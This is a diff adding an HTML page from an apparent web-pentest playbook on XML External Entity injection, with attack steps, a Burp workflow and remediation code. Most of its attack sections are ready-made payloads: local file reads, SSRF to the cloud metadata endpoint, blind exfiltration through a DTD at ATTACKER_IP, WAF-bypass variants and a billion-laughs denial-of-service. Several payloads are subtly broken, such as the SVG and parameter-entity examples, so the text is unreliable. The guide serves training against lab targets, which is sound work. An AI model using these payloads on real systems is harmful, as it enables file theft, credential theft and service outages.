@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="XML External Entity (XXE) injection testing guide: file disclosure, SSRF via XXE, and blind XXE exploitation with PortSwigger labs.">
+    <meta property="og:title" content="XXE Injection – Web App Pentesting Guide">
+    <meta property="og:description" content="XML External Entity (XXE) injection testing guide: file disclosure, SSRF via XXE, and blind XXE exploitation with PortSwigger labs.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>XXE Injection  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">XXE Injection</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">🎯 Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">⚙️ How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">🔍 Where to Look</a>
+    <a href="#burp-workflow">🛠️ Burp Workflow</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#payloads">💥 Payloads</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">🎯 Exploitation</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">✅ Checklist</a>
+    <a href="#labs">🧪 Labs</a>
+    <a href="#remediation">🔒 Remediation</a>
+    <a href="#mistakes">⚠️ Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A05 · CVSS 9.1 · Day 4</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M14 3v5a1 1 0 0 0 1 1h5"/><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="m9.5 13.5 5 5"/><path d="m14.5 13.5-5 5"/></svg></span><span>XXE Injection</span></h1>
+      <p>XML External Entity (XXE) injection allows attackers to read arbitrary files, perform SSRF attacks, or cause denial of service by exploiting how XML parsers process external entities. XXE is a critical vulnerability in any application that accepts XML input without proper validation.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Intermediate</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">The Fax Machine</div>
+        <p>Imagine a fax machine designed to receive and print documents. Normally, you send it a simple letter that says "Print this message." But one day, you send a fax with a cover sheet that includes instructions: "Before printing the letter, also fax me the contents of the file cabinet labeled /etc/passwd."</p>
+        <p>If the fax machine is poorly designed, it blindly follows every instruction in the document, including your embedded request. Instead of just printing your letter, it also retrieves and sends you sensitive files from the office server.</p>
+        <p>That's XXE in a nutshell: your XML document contains instructions (DOCTYPE declarations and entity definitions) that tell the parser to fetch and include other files or resources. If the parser isn't properly secured, it does exactly what you ask.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill probe"><span class="day-num">Day 2</span>Identify XML</div>
+        <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+        <div class="day-pill deep"><span class="day-num">Day 4</span>Deep Dive</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">⚡ Day 2  · Identify XML Attack Surfaces</div>
+        <p>On Day 2 during the app walkthrough, look for endpoints that accept XML. Check the Content-Type of POST requests in Burp HTTP history. Also try changing <code>Content-Type: application/json</code> to <code>application/xml</code> and convert the JSON body to XML  · some servers accept both. Note file upload endpoints that might accept .docx, .xlsx, .svg, .pdf (all XML-based).</p>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 4  · XXE Exploitation</div>
+        <p>Return to XML endpoints. Inject a DOCTYPE declaration and test for file read, then SSRF, then blind OOB. If the server returns the entity content in the response → classic XXE. If not → blind XXE with OOB (use interactsh for DNS callback).</p>
+        <pre><code>&lt;!-- File read XXE --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- Blind OOB XXE --&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://YOUR.interactsh.com/test"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- SSRF via XXE --&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+        <p><strong>Chain it:</strong> XXE → SSRF → internal services → AWS metadata → IAM credentials. Or: XXE via SVG upload → read app config → find hardcoded secrets.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>XXE exploits the XML specification's support for external entities. Here's the attack chain:</p>
+      <ol class="steps">
+        <li><strong>Identify XML input:</strong> Find an endpoint that accepts XML (POST body, file upload, SOAP service)</li>
+        <li><strong>Define external entity:</strong> Insert a DOCTYPE declaration with an ENTITY definition that references an external resource (local file, remote server)</li>
+        <li><strong>Reference the entity:</strong> Use the entity in the XML document (e.g., <code>&lt;value&gt;&amp;xxe;&lt;/value&gt;</code>)</li>
+        <li><strong>Parser processes entity:</strong> The XML parser resolves the external entity and includes its contents in the document</li>
+        <li><strong>Retrieve the data:</strong> The response includes the file contents or SSRF interaction result</li>
+      </ol>
+      <p>The vulnerability exists because XML parsers have DOCTYPE processing enabled by default in many programming languages (Java, PHP, Python, C#). These parsers will fetch remote resources, read local files, or even process billion laughs DoS attacks.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>XXE can appear in many contexts, not just obvious XML endpoints. Test these locations:</p>
+      <ul>
+        <li><strong>XML Content-Type endpoints:</strong> Any request with Content-Type: application/xml or text/xml</li>
+        <li><strong>SOAP web services:</strong> WSDL endpoints, SOAP request bodies</li>
+        <li><strong>File uploads:</strong> Files that may contain XML internally:
+          <ul>
+            <li>Microsoft Office files (.docx, .xlsx, .pptx  · these are ZIP archives containing XML)</li>
+            <li>SVG images (SVG is XML-based)</li>
+            <li>PDF uploads (if processed server-side)</li>
+            <li>RSS/Atom feeds</li>
+          </ul>
+        </li>
+        <li><strong>JSON endpoints with XML support:</strong> Some APIs accept both JSON and XML. Try changing Content-Type to application/xml</li>
+        <li><strong>API imports/data feeds:</strong> Any endpoint that imports or parses external data</li>
+        <li><strong>WebDAV implementations:</strong> File management endpoints that may use XML</li>
+        <li><strong>Configuration files:</strong> XML-based configuration uploads (e.g., Maven, Tomcat)</li>
+      </ul>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Identify XML endpoint:</strong> Browse the application and find any request containing XML data. Use Burp's filter to search for requests containing <code>&lt;</code> or <code>?xml</code>. Right-click and send to Repeater.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Inject basic XXE payload:</strong> Before the root XML element, add a DOCTYPE declaration with an ENTITY definition. For example, if the request is <code>&lt;root&gt;&lt;user&gt;test&lt;/user&gt;&lt;/root&gt;</code>, change it to:
+          <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/root&gt;</code></pre>
+          Send the request and check the response for file contents.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Test different file paths:</strong> If the basic payload works, try reading other sensitive files:
+          <ul>
+            <li><code>file:///etc/hostname</code> (confirm arbitrary file read)</li>
+            <li><code>file:///c:/windows/win.ini</code> (Windows systems)</li>
+            <li><code>file:///proc/self/environ</code> (environment variables on Linux)</li>
+          </ul>
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Test SSRF via XXE:</strong> Try making the parser fetch a URL instead of a local file:
+          <pre><code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"&gt;</code></pre>
+          This can access internal services (AWS metadata, admin panels, internal APIs).
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Test blind XXE:</strong> If no output appears in the response, the XXE is still being processed but the output isn't returned. Use Burp Collaborator to detect out-of-band interaction:
+          <pre><code>&lt;!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR_URL"&gt;</code></pre>
+          This forces the parser to make an HTTP request to your Collaborator server, proving XXE processing even without visible output.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Exfiltrate data with blind XXE:</strong> If you can't see output directly but can trigger OOB interactions, use a parameter entity to exfiltrate data:
+          <pre><code>&lt;!DOCTYPE root [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd"&gt;
+  %dtd;
+]&gt;</code></pre>
+          Host a DTD file on your server that processes %file and sends it to you.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">7</div>
+        <div>
+          <strong>Test file upload XXE:</strong> Upload an SVG, DOCX, or other XML-based file with embedded XXE payload. If the server parses it, you may achieve XXE without directly submitting XML.
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Basic File Read (In-Band XXE)</h3>
+      <p>The most straightforward XXE. The file contents appear in the response.</p>
+      <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</code></pre>
+
+      <h3>SSRF via XXE</h3>
+      <p>Make the parser fetch a URL, allowing you to interact with internal services. Useful for scanning AWS metadata, accessing admin panels, or targeting localhost services.</p>
+      <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;
+&lt;root&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;</code></pre>
+
+      <h3>Blind XXE with Out-of-Band (OOB) Detection</h3>
+      <p>When output isn't visible in the response, use external interaction to prove the vulnerability. Requires Burp Collaborator or attacker-controlled server.</p>
+      <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://burpcollaborator.net/UNIQUE_ID"&gt;]&gt;
+&lt;root&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;</code></pre>
+
+      <h3>XXE with Parameter Entities (Blind Data Exfiltration)</h3>
+      <p>Exfiltrate data from blind XXE using parameter entities and a custom DTD on your server.</p>
+      <p><strong>Payload sent to target:</strong></p>
+      <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://ATTACKER_IP:PORT/exfil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;root&gt;&lt;value&gt;&amp;data;&lt;/value&gt;&lt;/root&gt;</code></pre>
+      <p><strong>exfil.dtd on attacker server:</strong></p>
+      <pre><code>&lt;!ENTITY % all "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://ATTACKER_IP:PORT/?data=%file;'&gt;"&gt;
+%all;</code></pre>
+
+      <h3>XXE in SVG File Upload</h3>
+      <p>Many applications allow SVG uploads for image processing. SVG is XML-based and may be parsed server-side.</p>
+      <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
+&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
+   &lt;polygon points="1,1 1,50 50,50 50,1" fill="red"/&gt;
+   &lt;![CDATA[&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]]&gt;
+&lt;/svg&gt;</code></pre>
+
+      <h3>XXE in Microsoft Office Document (.DOCX)</h3>
+      <p>DOCX files are ZIP archives containing XML. Extract, modify, and repackage:</p>
+      <pre><code># Unzip the DOCX
+unzip document.docx
+
+# Edit document.xml to add XXE
+# Repackage
+zip -r document_evil.docx word/ _rels/ [Content_Types].xml
+</code></pre>
+
+      <h3>XInclude Attack (When DOCTYPE is Blocked)</h3>
+      <p>If DOCTYPE processing is disabled, try XInclude instead. XInclude allows including external XML files within regular XML elements.</p>
+      <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include href="file:///etc/passwd"/&gt;
+&lt;/root&gt;</code></pre>
+
+      <h3>Error-Based XXE (Information Disclosure via Error Messages)</h3>
+      <p>Force an XML parse error that includes the file contents in the error message.</p>
+      <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;foo&gt;&lt;![CDATA[&amp;xxe;]]&gt;&lt;/foo&gt;</code></pre>
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          <span>Progress: <span class="progress-mini">0/12</span></span>
+          <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        </div>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Identify all XML endpoints (Content-Type: application/xml, text/xml)</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Try basic XXE file read with /etc/passwd or c:\windows\win.ini</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Test SSRF via XXE (http://127.0.0.1:8080, AWS metadata)</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Test blind XXE with Burp Collaborator (OOB interaction)</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Try parameter entity blind exfiltration with custom DTD</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Test file uploads (SVG, DOCX, XLSX, PDF) for XXE</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>If DOCTYPE blocked, try XInclude attack</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Check for XXE in SOAP/WebService endpoints</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Try changing Content-Type to application/xml on JSON endpoints</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Test error-based XXE (trigger parse errors)</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Enumerate internal services via SSRF XXE (port scanning)</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Document all successful XXE vectors with proof-of-concept</span>
+        </label>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+      <p>If basic XXE payloads are blocked, try these evasion techniques:</p>
+
+      <h3>XML Encoding Variations</h3>
+      <p>Encode the DOCTYPE or entity definition to bypass string-based WAF rules:</p>
+      <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code></pre>
+      <p>Try changing encoding declaration to UTF-16 or UTF-32, which may bypass pattern-matching WAF rules that look for UTF-8 strings.</p>
+
+      <h3>UTF-16 Encoding</h3>
+      <pre><code>FF FE 3C 3F 78 6D 6C ...  (UTF-16LE byte sequence)</code></pre>
+      <p>Some WAFs check for "DOCTYPE" or "ENTITY" as plain text. UTF-16 encoding obfuscates these strings.</p>
+
+      <h3>URL Encoding in Attribute Values</h3>
+      <p>If the WAF blocks the literal word "file", try encoding it in various forms within the entity reference.</p>
+
+      <h3>Case Variation</h3>
+      <p>Some filters are case-sensitive. Try <code>&lt;!DOCTYPE&gt;, &lt;!Doctype&gt;, &lt;!doctype&gt;</code>, though most modern parsers normalize this.</p>
+
+      <h3>Polyglot Attacks</h3>
+      <p>If the endpoint accepts both XML and JSON, submit JSON with embedded XML:</p>
+      <pre><code>{"data": "&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;"}</code></pre>
+
+      <h3>Nested Entity Definition</h3>
+      <p>Use parameter entities to define entities indirectly, potentially bypassing simple entity-name filters:</p>
+      <pre><code>&lt;!ENTITY % pe SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY send "%pe;"&gt;</code></pre>
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+      <h3>Arbitrary File Read</h3>
+      <p>The most direct impact: read sensitive files from the server. On Linux, target <code>/etc/passwd</code>, <code>/etc/shadow</code> (if running as root), application configuration files (database credentials, API keys), and source code. On Windows, read <code>c:\windows\win.ini</code>, registry hives, or application config files.</p>
+
+      <h3>SSRF and Internal Network Scanning</h3>
+      <p>Use XXE to make the server request URLs on the internal network. Scan for open ports on 127.0.0.1, enumerate AWS metadata (http://169.254.169.254/latest/meta-data/), or access internal admin panels. Blind XXE with timing attacks can even reveal service availability.</p>
+
+      <h3>Denial of Service (Billion Laughs Attack)</h3>
+      <p>Construct an XML payload with nested entity references that cause exponential expansion:</p>
+      <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+]&gt;
+&lt;lol&gt;&amp;lol3;&lt;/lol&gt;</code></pre>
+      <p>This causes the parser to consume massive amounts of memory and CPU, crashing the application.</p>
+
+      <h3>Remote Code Execution (Rare, Indirect)</h3>
+      <p>In very specific configurations, XXE can lead to RCE. For example, if a Java application uses an unsafe XSLT processor, you can use XXE to execute Java code. In PHP with certain extensions, external DTDs could be used to trigger code execution.</p>
+
+      <h3>Blind XXE Data Exfiltration</h3>
+      <p>Use parameter entities and a custom DTD to exfiltrate data even when you can't see the output directly. The server makes an HTTP request to your attacker-controlled server with the exfiltrated data encoded in the URL.</p>
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+      <p>XXE is fully preventable by properly configuring XML parsers. Here are the fixes:</p>
+
+      <h3>Disable DOCTYPE Processing (Java)</h3>
+      <pre><code>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);</code></pre>
+
+      <h3>Disable External Entities (Python)</h3>
+      <pre><code>from defusedxml import ElementTree as ET
+tree = ET.parse('file.xml')  # Uses safe defaults by default</code></pre>
+
+      <h3>Disable External Entities (PHP)</h3>
+      <pre><code>libxml_disable_entity_loader(true);
+$dom = new DOMDocument();
+$dom->load('file.xml');</code></pre>
+
+      <h3>Disable External Entities (.NET)</h3>
+      <pre><code>XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;
+settings.XmlResolver = null;
+XmlReader reader = XmlReader.Create("file.xml", settings);</code></pre>
+
+      <h3>Use Safe XML Libraries</h3>
+      <p>Prefer libraries designed for security by default: defusedxml (Python), Nokogiri with secure options (Ruby), or avoid XML parsing altogether if possible.</p>
+
+      <h3>Prefer JSON Over XML</h3>
+      <p>JSON doesn't support external entities. Migrating from XML to JSON eliminates the entire attack surface.</p>
+
+      <h3>Input Validation</h3>
+      <p>While not a replacement for proper parser configuration, validate that XML input doesn't contain DOCTYPE declarations or external entity definitions.</p>
+
+      <h3>Set FEATURE_SECURE_PROCESSING</h3>
+      <p>Some XML parsers support a secure processing flag that disables dangerous features:</p>
+      <pre><code>dbf.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);</code></pre>
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>Practice XXE exploitation with these PortSwigger Web Security Academy labs:</p>
+      <ul>
+        <li>Exploiting XXE to retrieve files</li>
+        <li>Exploiting XXE to perform SSRF attacks</li>
+        <li>Blind XXE with error-based detection</li>
+        <li>Blind XXE with out-of-band interaction</li>
+        <li>Blind XXE with out-of-band interaction via XML parameter entities</li>
+        <li>Exploiting XXE via image file upload</li>
+        <li>XXE in SVG file uploads</li>
+        <li>XXE via modified content type</li>
+        <li>XXE in SOAP web service</li>
+      </ul>
+      <p>Each lab progressively increases in difficulty and introduces new XXE scenarios. Complete all 9+ labs to master XXE exploitation.</p>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+      <div class="callout warn">
+        <div class="callout-title">Don't Fall Into These Traps</div>
+        <ul>
+          <li><strong>Assuming non-XML endpoints are safe:</strong> JSON endpoints sometimes accept XML if you change the Content-Type header. Always test.</li>
+          <li><strong>Giving up when DOCTYPE is blocked:</strong> If DOCTYPE processing is disabled, try XInclude instead. Different parsing mechanisms can bypass individual filters.</li>
+          <li><strong>Not testing blind XXE:</strong> Even if you see no output, the XXE is still being processed. Use Burp Collaborator to detect out-of-band interaction.</li>
+          <li><strong>Ignoring file uploads:</strong> Office documents (DOCX, XLSX), PDFs, and SVGs contain XML internally. Upload handlers often parse this XML, making them XXE targets.</li>
+          <li><strong>Not testing SSRF via XXE:</strong> XXE isn't just about reading files. Use it to scan internal networks, access metadata services, or interact with internal APIs.</li>
+          <li><strong>Forgetting parameter entities:</strong> If basic entity definition doesn't work, try parameter entities (<code>%entity;</code>) which follow different parsing rules.</li>
+          <li><strong>Testing only /etc/passwd:</strong> This file might not exist or might not be readable. Always test with files you can confirm exist (try /etc/hostname, /etc/os-release, or config files in common locations).</li>
+          <li><strong>Not exfiltrating data in blind XXE:</strong> When you can't see output, don't assume failure. Use parameter entities and a custom DTD to exfiltrate data via HTTP requests to your server.</li>
+        </ul>
+      </div>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>XXE is a multi-tool  · it can read files, probe internal services, and exfiltrate data out-of-band.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="ssrf.html">
+        <span class="sa-icon">📡</span>
+        <span class="sa-name">SSRF</span>
+        <span class="sa-why">XXE with an http:// entity URL is SSRF  · it reaches internal services the attacker can't access directly.</span>
+      </a>
+      <a class="see-also-card" href="path-traversal.html">
+        <span class="sa-icon">📁</span>
+        <span class="sa-name">Path Traversal</span>
+        <span class="sa-why">XXE file:// entities read arbitrary files on the server  · equivalent to path traversal with full filesystem access.</span>
+      </a>
+      <a class="see-also-card" href="file-upload.html">
+        <span class="sa-icon">📂</span>
+        <span class="sa-name">File Upload</span>
+        <span class="sa-why">Upload an SVG or Office document with an XXE payload  · the server-side parser fires the entity on processing.</span>
+      </a>
+      <a class="see-also-card" href="deserialization.html">
+        <span class="sa-icon">📦</span>
+        <span class="sa-name">Deserialization</span>
+        <span class="sa-why">Both involve the server processing a data format you control. Java apps with XML parsing often also deserialize objects.</span>
+      </a>
+    </div>
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'Copy';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+});
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+const STORAGE_KEY = 'xxe-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') {
+    cb.checked = true;
+    cb.closest('.checklist-item').classList.add('done');
+  }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length / all.length * 100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
